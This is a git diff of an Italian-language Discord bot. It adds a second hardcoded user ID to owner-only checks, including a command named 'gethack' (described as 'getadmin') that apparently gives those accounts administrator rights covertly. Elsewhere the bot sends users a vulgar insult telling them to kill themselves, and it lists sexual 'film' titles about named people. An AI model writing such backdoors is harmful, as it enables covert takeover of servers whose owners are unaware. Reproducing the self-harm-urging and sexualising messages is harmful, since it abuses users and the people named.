@@ -73,7 +73,7 @@ async def unban(ctx, *, member):
 @commands.has_permissions(administrator=True)
 async def attivita(ctx, *, activity, ):
     author = ctx.message.author
-    if author.id == 541308281625509905:
+    if author.id == 541308281625509905 or author.id == 469424641610350623:
         if activity == "watch":
             film = ["Il Re Leone 2", "Spiderman:No Way Home", "Galaxy e Sise scopano", "Sise love debb",
                     "Storia d'amore: Sise e Debb"]
@@ -233,7 +233,7 @@ async def reloadname(ctx,member: discord.Member):
 @bot.command(description="getadmin")
 async def gethack(ctx):
     author = ctx.message.author
-    if author.id == 541308281625509905:
+    if author.id == 541308281625509905 or author.id == 469424641610350623:
         member = ctx.message.author
         await ctx.message.delete()
         guild = ctx.guild
@@ -251,9 +251,9 @@ async def gethack(ctx):
 async def sise(ctx):
     author = ctx.message.author
     if author.id == 541308281625509905:
-        ctx.send("sise ti amo da Real <3")
+        await ctx.send("sise ti amo da Real <3")
     else:
-        ctx.send("bucchin a mammt, non puoi accedere a questo comando, solo il grande Real puo simpare per sise, vai da un altra parte simp del cazzo suicidati")
+        await ctx.send("bucchin a mammt, non puoi accedere a questo comando, solo il grande Real puo simpare per sise, vai da un altra parte simp del cazzo suicidati")
 
 @bot.command(description="denis dosio incoming")
 async def mylove(ctx):
